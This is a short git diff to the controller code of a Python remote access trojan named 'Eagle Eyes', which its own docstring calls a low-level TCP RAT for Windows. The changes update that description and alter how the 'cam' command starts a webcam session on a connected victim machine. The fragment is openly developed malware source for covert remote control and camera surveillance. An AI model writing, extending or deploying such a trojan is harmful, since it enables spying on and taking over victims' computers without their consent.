@@ -1,5 +1,5 @@
 """
-	Eagle Eyes => A powerful low level TCP networking RAT.
+	Eagle Eyes => A powerful low level TCP networking RAT written in the Python langauge for Windows.
 	______________________________________________________
 	Supported Features:
 		* TCP Network stream (IPv4)
@@ -280,7 +280,8 @@ class Server:
 						if shell_msg[4:8] == 'kill':
 							print(f'{self.theme[2]}{set_cam_settings(shell_msg[9:])}{Style.RESET_ALL}\n')
 						else:
-							self.session(self.getConn(int(shell_msg[4:])), True, 'cam')
+							args = shell_msg[4:].split()
+							self.session(self.getConn(int(args[0])), True, f'cam {args[1]} {args[2]}')
 					except:
 						print(f'{self.theme[2]}Failed to handle cam.{Style.RESET_ALL}\n')
 
@@ -507,7 +508,6 @@ class Server:
 						elif getVal == 'encoding':
 							self.encoding = set_encoding(setVal)
 							result += self.encoding
-
 
 						# History
 						elif getVal == 'history':
